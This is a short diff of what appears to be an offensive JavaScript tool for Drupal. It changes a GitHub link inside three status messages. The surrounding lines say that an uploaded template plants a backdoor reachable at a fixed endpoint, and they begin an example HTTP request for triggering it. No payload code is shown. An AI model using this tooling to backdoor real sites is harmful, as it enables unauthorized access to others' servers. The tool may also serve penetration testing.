@@ -642,7 +642,7 @@ function DPUploadTemplate() {
                                             "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been enabled!",
                                             "About": [
                                                 "If you're utilizing the default Hello World template included in the exploit, you can activate the backdoor functionality by accessing the designated endpoint '/b7b3c4328d3631fb7040cad205e15686'.",
-                                                "To see examples, check: https://github.com/nowak0x01/drupalwned.js",
+                                                "To see examples, check: https://github.com/nowak0x01/Drupalwned",
                                                 "",
                                                 "# HTTP Request Example #",
                                                 "POST /b7b3c4328d3631fb7040cad205e15686 HTTP/2",
@@ -855,7 +855,7 @@ function DPUploadTemplate() {
                                             "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been enabled!",
                                             "About": [
                                                 "If you're utilizing the default Custom Analytics template included in the exploit, you can activate the backdoor functionality by accessing the designated endpoint '/b7b3c4328d3631fb7040cad205e15686'.",
-                                                "To see examples, check: https://github.com/nowak0x01/drupalwned.js",
+                                                "To see examples, check: https://github.com/nowak0x01/Drupalwned",
                                                 "",
                                                 "# HTTP Request Example #",
                                                 "POST /b7b3c4328d3631fb7040cad205e15686 HTTP/2",
@@ -1081,7 +1081,7 @@ function DPUploadTemplate() {
                                             "Message": "[Sucessful] Stage 2 - The Template " + TemplatePrefix + " has been enabled!",
                                             "About": [
                                                 "If you're utilizing the default Drupal Analytics template included in the exploit, you can activate the backdoor functionality by accessing the designated endpoint '/b7b3c4328d3631fb7040cad205e15686'.",
-                                                "To see examples, check: https://github.com/nowak0x01/drupalwned.js",
+                                                "To see examples, check: https://github.com/nowak0x01/Drupalwned",
                                                 "",
                                                 "# HTTP Request Example #",
                                                 "POST /b7b3c4328d3631fb7040cad205e15686 HTTP/2",
